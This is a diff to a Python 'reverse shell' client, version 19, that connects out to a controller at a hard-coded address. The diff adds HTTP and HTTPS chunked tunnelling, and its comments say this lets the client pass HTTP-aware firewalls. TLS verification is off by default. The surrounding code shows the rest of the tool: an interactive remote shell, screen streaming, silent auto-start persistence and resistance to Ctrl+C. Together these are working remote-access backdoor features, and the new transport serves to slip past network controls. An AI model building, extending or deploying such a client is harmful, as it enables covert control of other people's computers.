@@ -18,6 +18,7 @@ import select
 import shutil
 import signal
 import socket
+import ssl
 import stat
 import struct
 import subprocess
@@ -26,12 +27,34 @@ import tempfile
 import threading
 import time
 
+# ---------------------------------------------------------------------------
+# Transport selection.  Edit this one line in BOTH files, exactly the same:
+#     tcp    raw TCP (the original, lowest overhead)
+#     http   an HTTP/1.1 chunked tunnel (works through HTTP-aware firewalls)
+#     https  the same tunnel inside TLS (HTTP/1.1 over TLS 1.2/1.3)
+# Both bare names and quoted strings are accepted: connection_type = http or
+# connection_type = 'http'.  HTTP/2 requires a separate HTTP/2 stack; this
+# implementation intentionally uses the standard-library HTTP/1.1 tunnel so
+# it runs on every supported Python (3.9+) without third-party modules.
+# ---------------------------------------------------------------------------
+tcp = 'tcp'
+http = 'http'
+https = 'https'
+connection_type = tcp          # <- https / http / tcp
+
 DEFAULT_IP = '192.168.0.113'
 DEFAULT_PORT = 4444
 RETRY_DELAY = 1               # seconds between reconnect attempts
 CONNECT_TIMEOUT = 3           # seconds a TCP connect may take before we retry
 MAX_FILE = 50 * 1024 * 1024   # 50 MB
 MAX_MSG = 96 * 1024 * 1024    # sanity bound for one protocol message
+CONNECTION_TYPE = str(os.environ.get('TUNNEL_TYPE') or connection_type).strip().lower()
+VALID_CONNECTION_TYPES = ('tcp', 'http', 'https')
+HTTP_HANDSHAKE_TIMEOUT = 10    # seconds for HTTP headers / TLS handshake
+HTTP_SEND_STALL_TIMEOUT = 10   # tolerate a slow-but-moving mobile link
+HTTP_MAX_HEADER = 32 * 1024    # reject an endless response header
+HTTP_MAX_LINE = 4096           # one chunk-size/trailer line
+HTTP_MAX_CHUNK = MAX_MSG       # one HTTP chunk cannot claim unlimited memory
 MAX_OUTPUT = 8 * 1024 * 1024  # keep this much output; a flood is cut off, not killed
 SCREEN_SIZE = (960, 540)      # screen share frame size (width, height)
 SCREEN_JPEG_QUALITY = 70      # JPEG quality for streamed frames
@@ -1546,16 +1569,22 @@ def _recv_exact(sock, n):
 
 
 def _connect_shell(host, port):
-    """Connect to the controller's shell port, retrying briefly so a slow
-    accept on the controller side cannot lose the session."""
+    """Connect to the controller's shell channel, retrying for a short while.
+
+    In tcp mode this is the controller's temporary listener.  In http/https
+    mode it is POST /shell on the main controller port, so no extra firewall
+    hole is needed."""
     deadline = time.time() + SHELL_CONNECT_TIMEOUT
     while True:
         if SHELL_CANCEL.is_set():
             raise OSError('shell cancelled')
         try:
-            # A short connect timeout keeps stop_shell() responsive while
-            # still retrying for the full SHELL_CONNECT_TIMEOUT window.
-            sock = socket.create_connection((host, port), timeout=1)
+            if CONNECTION_TYPE in ('http', 'https'):
+                sock = _http_connect(host, port, '/shell')
+            else:
+                # A short connect timeout keeps stop_shell() responsive while
+                # still retrying for the full SHELL_CONNECT_TIMEOUT window.
+                sock = socket.create_connection((host, port), timeout=1)
         except OSError:
             if SHELL_CANCEL.is_set():
                 raise
@@ -1570,7 +1599,10 @@ def _connect_shell(host, port):
                 pass
             raise OSError('shell cancelled')
         sock.settimeout(None)
-        _tune_socket(sock)
+        try:
+            _tune_socket(sock)
+        except OSError:
+            pass
         try:
             sock.set_inheritable(False)     # never leak into the shell child
         except (AttributeError, OSError):
@@ -3188,21 +3220,428 @@ def _connect_target(host, port):
     raise last_error or OSError('no usable address for {}'.format(host))
 
 
+# ---------------------------------------------------------------------------
+# HTTP / HTTPS transport (client side)
+#
+# The raw protocol is unchanged.  The client writes a chunked POST /tunnel
+# request and reads the controller's chunked 200 response.  Every command,
+# file, frame and the interactive shell POST /shell travels through the same
+# socketpair-shaped adapter, so the rest of the client stays transport-agnostic.
+# ---------------------------------------------------------------------------
+
+def _read_http_head(sock, timeout=HTTP_HANDSHAKE_TIMEOUT):
+    try:
+        sock.settimeout(timeout)
+    except (AttributeError, OSError):
+        pass
+    data = b''
+    try:
+        while b'\r\n\r\n' not in data:
+            if len(data) > HTTP_MAX_HEADER:
+                raise OSError('HTTP response headers are too large')
+            chunk = sock.recv(min(4096, HTTP_MAX_HEADER + 1 - len(data)))
+            if not chunk:
+                raise OSError('controller closed during the HTTP handshake')
+            data += chunk
+    except (socket.timeout, TimeoutError):
+        raise OSError('HTTP handshake timed out')
+    finally:
+        try:
+            sock.settimeout(None)
+        except (AttributeError, OSError):
+            pass
+    head, _sep, extra = data.partition(b'\r\n\r\n')
+    if len(head) > HTTP_MAX_HEADER:
+        raise OSError('HTTP response headers are too large')
+    return head.decode('latin-1', 'replace'), extra
+
+
+def _http_headers(lines):
+    headers = {}
+    for line in lines:
+        if not line:
+            continue
+        if line[:1] in (' ', '\t'):
+            raise OSError('folded HTTP headers are not accepted')
+        if ':' not in line:
+            raise OSError('malformed HTTP response header')
+        key, value = line.split(':', 1)
+        key = key.strip().lower()
+        if not key:
+            raise OSError('empty HTTP response header')
+        old = headers.get(key)
+        headers[key] = (old + ',' + value.strip()) if old else value.strip()
+    return headers
+
+
+class HttpTunnel(object):
+    """Socket-shaped full-duplex adapter over one HTTP/1.1 exchange."""
+
+    def __init__(self, raw, initial=b'', name='http-tunnel'):
+        self.raw = raw
+        self.name = name
+        self._in, self._out = socket.socketpair()
+        self._in.settimeout(None)
+        # The pump writes into the application side of the pair.  A one
+        # second timeout lets close() stop a pump that is blocked because the
+        # application stopped reading; it never delays a normal transfer.
+        self._out.settimeout(1.0)
+        try:
+            for sock in (self._in, self._out):
+                sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024 * 1024)
+                sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1024 * 1024)
+        except OSError:
+            pass
+        self._buf = bytearray(initial)
+        self._send_lock = threading.Lock()
+        self._closed = False
+        self._resources_closed = False
+        self._write_closed = False
+        self._reader = threading.Thread(target=self._pump,
+                                        name=name + '-reader', daemon=True)
+        self._reader.start()
+
+    def fileno(self):
+        return self._in.fileno()
+
+    def __getattr__(self, name):
+        return getattr(self._in, name)
+
+    def send(self, data):
+        if not data:
+            return 0
+        with self._send_lock:
+            if self._closed or self._write_closed:
+                raise OSError('HTTP tunnel is closed')
+            try:
+                self._raw_send(('{:x}\r\n'.format(len(data))).encode('ascii'))
+                self._raw_send(data)
+                self._raw_send(b'\r\n')
+            except OSError:
+                self._broken()
+                raise
+        return len(data)
+
+    def sendall(self, data):
+        self.send(data)
+
+    def _end_write(self):
+        with self._send_lock:
+            if self._closed or self._write_closed:
+                return
+            self._write_closed = True
+            try:
+                self._raw_send(b'0\r\n\r\n')
+            except OSError:
+                self._broken()
+
+    def shutdown(self, how):
+        if how in (socket.SHUT_WR, socket.SHUT_RDWR):
+            self._end_write()
+        if how in (socket.SHUT_RD, socket.SHUT_RDWR):
+            try:
+                self._in.shutdown(socket.SHUT_RD)
+            except OSError:
+                pass
+
+    def close(self):
+        # _broken() marks the stream closed early, but the descriptors still
+        # have to be released: a send failure used to leak the raw socket and
+        # both socketpair ends on every reconnect.
+        self._closed = True
+        if self._resources_closed:
+            return
+        self._resources_closed = True
+        try:
+            self.raw.shutdown(socket.SHUT_RDWR)
+        except OSError:
+            pass
+        try:
+            self.raw.close()
+        except OSError:
+            pass
+        for sock in (self._in, self._out):
+            try:
+                sock.shutdown(socket.SHUT_RDWR)
+            except OSError:
+                pass
+            try:
+                sock.close()
+            except OSError:
+                pass
+
+    def _broken(self):
+        self._closed = True
+        try:
+            self.raw.shutdown(socket.SHUT_RDWR)
+        except OSError:
+            pass
+
+    def _raw_send(self, data):
+        view = memoryview(data)
+        last_progress = time.time()
+        while view:
+            try:
+                sent = self.raw.send(view)
+            except (socket.timeout, TimeoutError):
+                # SO_SNDTIMEO bounds one kernel wait.  Treat several waits as
+                # one slow transfer instead of dropping a mobile link that is
+                # still draining, but still fail when there is no progress.
+                if time.time() - last_progress > HTTP_SEND_STALL_TIMEOUT:
+                    raise OSError('HTTP tunnel send stalled')
+                time.sleep(0.02)
+                continue
+            if sent <= 0:
+                raise OSError('HTTP tunnel closed while sending')
+            view = view[sent:]
+            last_progress = time.time()
+
+    def _raw_read(self, n):
+        while len(self._buf) < n:
+            try:
+                chunk = self.raw.recv(65536)
+            except (socket.timeout, TimeoutError):
+                raise OSError('HTTP tunnel receive stalled')
+            if not chunk:
+                raise ConnectionError('HTTP tunnel closed')
+            self._buf += chunk
+        data = bytes(self._buf[:n])
+        del self._buf[:n]
+        return data
+
+    def _read_line(self):
+        while b'\r\n' not in self._buf:
+            if len(self._buf) > HTTP_MAX_LINE:
+                raise OSError('HTTP chunk line is too large')
+            try:
+                chunk = self.raw.recv(65536)
+            except (socket.timeout, TimeoutError):
+                raise OSError('HTTP tunnel receive stalled')
+            if not chunk:
+                raise ConnectionError('HTTP tunnel closed')
+            self._buf += chunk
+        line, _sep, rest = self._buf.partition(b'\r\n')
+        if len(line) > HTTP_MAX_LINE:
+            raise OSError('HTTP chunk line is too large')
+        self._buf = bytearray(rest)
+        return bytes(line)
+
+    def _write_local(self, data):
+        """Feed decoded body bytes to the application side of the pair.
+
+        The timeout turns a permanently full socketpair into a wake-up once a
+        second, so HttpTunnel.close() can stop the pump even when the rest of
+        the client is no longer reading.  Data is still delivered in order and
+        without an artificial delay."""
+        view = memoryview(data)
+        while view:
+            try:
+                sent = self._out.send(view)
+            except (socket.timeout, TimeoutError):
+                if self._closed:
+                    raise ConnectionError('HTTP tunnel closed')
+                continue
+            if sent <= 0:
+                raise ConnectionError('HTTP tunnel closed')
+            view = view[sent:]
+
+    def _pump(self):
+        try:
+            while not self._closed:
+                line = self._read_line()
+                if not line:
+                    continue
+                size_text = line.split(b';', 1)[0].strip()
+                try:
+                    size = int(size_text, 16)
+                except ValueError:
+                    raise OSError('invalid HTTP chunk size')
+                if size < 0 or size > HTTP_MAX_CHUNK:
+                    raise OSError('HTTP chunk is too large')
+                if size == 0:
+                    trailer_bytes = 0
+                    trailer_count = 0
+                    while True:
+                        trailer = self._read_line()
+                        trailer_bytes += len(trailer) + 2
+                        if trailer_bytes > HTTP_MAX_HEADER:
+                            raise OSError('HTTP trailers are too large')
+                        if not trailer:
+                            break
+                        trailer_count += 1
+                        if trailer_count > 128:
+                            raise OSError('too many HTTP trailers')
+                    break
+                remaining = size
+                while remaining:
+                    piece = self._raw_read(min(remaining, 65536))
+                    if not piece:
+                        raise ConnectionError('HTTP chunk ended early')
+                    self._write_local(piece)
+                    remaining -= len(piece)
+                if self._raw_read(2) != b'\r\n':
+                    raise OSError('missing HTTP chunk terminator')
+        except (OSError, ValueError, ConnectionError):
+            pass
+        finally:
+            try:
+                self._out.shutdown(socket.SHUT_WR)
+            except OSError:
+                pass
+
+
+def _client_tls_context():
+    """TLS 1.2/1.3 client context.
+
+    A self-signed certificate is accepted by default so the one-line switch
+    works out of the box.  Set CONTROLLER_TLS_VERIFY=1 (and optionally
+    CONTROLLER_TLS_CA=/path/ca.pem) for normal certificate verification."""
+    verify = (os.environ.get('CONTROLLER_TLS_VERIFY') or '').strip().lower()
+    verify = verify in ('1', 'true', 'yes', 'on')
+    try:
+        if verify:
+            cafile = os.environ.get('CONTROLLER_TLS_CA') or None
+            context = ssl.create_default_context(cafile=cafile)
+        else:
+            context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+            context.check_hostname = False
+            context.verify_mode = ssl.CERT_NONE
+        try:
+            context.minimum_version = ssl.TLSVersion.TLSv1_2
+        except AttributeError:
+            pass
+        try:
+            context.options |= ssl.OP_NO_COMPRESSION
+        except AttributeError:
+            pass
+        try:
+            context.set_alpn_protocols(['http/1.1'])
+        except (AttributeError, NotImplementedError):
+            pass
+        return context
+    except (OSError, ssl.SSLError) as e:
+        raise OSError('cannot create TLS client context: {}'.format(e))
+
+
+def _wrap_client_tls(sock, host):
+    context = _client_tls_context()
+    try:
+        return context.wrap_socket(sock, server_hostname=host)
+    except (OSError, ssl.SSLError) as e:
+        try:
+            sock.close()
+        except OSError:
+            pass
+        raise OSError('TLS handshake failed: {}'.format(e))
+
+
+def _http_connect(host, port, path='/tunnel'):
+    """Open one HTTP/HTTPS tunnel to a controller."""
+    sock = _connect_target(host, port)
+    try:
+        _tune_socket(sock)
+        if CONNECTION_TYPE == 'https':
+            # create_connection() leaves a 3-second connect timeout on the
+            # socket.  The TLS handshake may legitimately take longer than
+            # that on a busy mobile link, so widen it before wrapping.
+            sock.settimeout(HTTP_HANDSHAKE_TIMEOUT)
+            sock = _wrap_client_tls(sock, host)
+            try:
+                selected = sock.selected_alpn_protocol()
+            except (AttributeError, NotImplementedError, OSError):
+                selected = None
+            if selected not in (None, 'http/1.1'):
+                raise OSError('TLS negotiated {!r}; this tunnel needs HTTP/1.1'
+                              .format(selected))
+        sock.settimeout(HTTP_HANDSHAKE_TIMEOUT)
+        host_header = str(host)
+        if ':' in host_header and not host_header.startswith('['):
+            host_header = '[{}]'.format(host_header)
+        request = (
+            'POST {} HTTP/1.1\r\n'
+            'Host: {}:{}\r\n'
+            'User-Agent: reverse-client/19\r\n'
+            'Content-Type: application/octet-stream\r\n'
+            'Transfer-Encoding: chunked\r\n'
+            'Connection: keep-alive\r\n'
+            'Cache-Control: no-store\r\n'
+            '\r\n'
+        ).format(path, host_header, port).encode('latin-1')
+        sock.sendall(request)
+        head, extra = _read_http_head(sock)
+        lines = head.split('\r\n')
+        if not lines:
+            raise OSError('empty HTTP response')
+        status = lines[0].split(None, 2)
+        if len(status) < 2:
+            raise OSError('malformed HTTP status line: {!r}'.format(lines[0]))
+        if status[0].upper() != 'HTTP/1.1':
+            raise OSError('controller/proxy answered {!r}; HTTP/1.1 is required'
+                          .format(status[0]))
+        try:
+            code = int(status[1])
+        except ValueError:
+            raise OSError('malformed HTTP status code: {!r}'.format(status[1]))
+        if code != 200:
+            raise OSError('controller returned HTTP {} {}'.format(
+                code, status[2] if len(status) > 2 else ''))
+        headers = _http_headers(lines[1:])
+        transfer_tokens = [item.strip() for item in
+                           headers.get('transfer-encoding', '').lower().split(',')
+                           if item.strip()]
+        if (not transfer_tokens or transfer_tokens[-1] != 'chunked'
+                or any(item not in ('identity', 'chunked')
+                       for item in transfer_tokens[:-1])):
+            raise OSError('controller response is not chunked')
+        encoding = headers.get('content-encoding', '').strip().lower()
+        if encoding not in ('', 'identity'):
+            raise OSError('controller/proxy compressed the tunnel '
+                          '({}); disable HTTP compression for this port'
+                          .format(encoding))
+        sock.settimeout(None)
+        return HttpTunnel(sock, extra, name='http-' + path.strip('/'))
+    except Exception:
+        try:
+            sock.close()
+        except OSError:
+            pass
+        raise
+
+
+def _open_controller_connection(host, port):
+    if CONNECTION_TYPE == 'tcp':
+        return _connect_target(host, port)
+    if CONNECTION_TYPE in ('http', 'https'):
+        return _http_connect(host, port, '/tunnel')
+    raise OSError('unknown connection_type {!r}'.format(connection_type))
+
+
 def main():
     _harden_console()            # a hostile/odd name must never kill printing
     _immune_to_ctrl_c()          # Ctrl+C is never a way to stop this client
     _windows_dpi_aware()         # correct screenshot pixels on scaled displays
+    if CONNECTION_TYPE not in VALID_CONNECTION_TYPES:
+        print("[!] Unknown connection_type {!r}. Use one of: tcp, http, https."
+              .format(CONNECTION_TYPE))
+        return
     if any(a in ('-h', '--help') for a in sys.argv[1:]):
         print('usage: python client.py [controller_ip] [controller_port]')
         print('       --persist          install auto-start (silent) for this client')
         print('       --visible          with --persist: show a window instead')
         print('       --log-file PATH    with --persist: keep a log file')
         print('       --remove-persist   remove the auto-start entry')
+        print('       connection_type is set in the source: tcp, http or https')
+        print('       (edit the same line in controller.py and client.py)')
         return
 
     target_ip, target_port, do_persist, do_remove, visible, log_file = parse_args(sys.argv[1:])
 
-    print("[+] Reverse TCP screen-share client v19")
+    print("[+] Reverse {} screen-share client v19".format(
+        CONNECTION_TYPE.upper()))
+    if CONNECTION_TYPE == 'https':
+        print("[i] HTTPS: TLS 1.2/1.3, HTTP/1.1 tunnel. The controller's")
+        print("    self-signed certificate is accepted by default; set")
+        print("    CONTROLLER_TLS_VERIFY=1 and CONTROLLER_TLS_CA for verification.")
 
     if _loopback_target(target_ip) and not do_remove:
         print("[i] {} is this machine's own loopback address - that only works".format(target_ip))
@@ -3261,7 +3700,7 @@ def main():
                 # create_connection covers DNS and every address family, and the
                 # timeout bounds a dead/silent host: a plain connect() could sit
                 # in the kernel for ~127 s, which looked like a frozen client.
-                client_socket = _connect_target(target_ip, target_port)
+                client_socket = _open_controller_connection(target_ip, target_port)
                 client_socket.settimeout(None)
                 break
             except Exception as e:
@@ -3271,8 +3710,12 @@ def main():
                         target_ip, target_port, _connect_error_hint(e), RETRY_DELAY))
                 time.sleep(RETRY_DELAY)
 
-        print("[+] Reverse TCP shell connected to {}:{}".format(target_ip, target_port))
-        _tune_socket(client_socket)      # fast reconnect when this controller dies
+        print("[+] Reverse {} shell connected to {}:{}".format(
+            CONNECTION_TYPE.upper(), target_ip, target_port))
+        try:
+            _tune_socket(client_socket)  # fast reconnect when this controller dies
+        except OSError:
+            pass
 
         # Tell the controller what this machine has (OS, session, capture tools)
         # so it can explain any missing dependency with exact install commands.
@@ -3280,7 +3723,6 @@ def main():
             send_msg(client_socket, {'type': 'hello', 'env': environment_report()})
         except OSError:
             pass
-
         # Serve commands until the controller goes away (then reconnect and wait)
         stop = False
         del DEFERRED[:]                      # nothing left over from a dead session
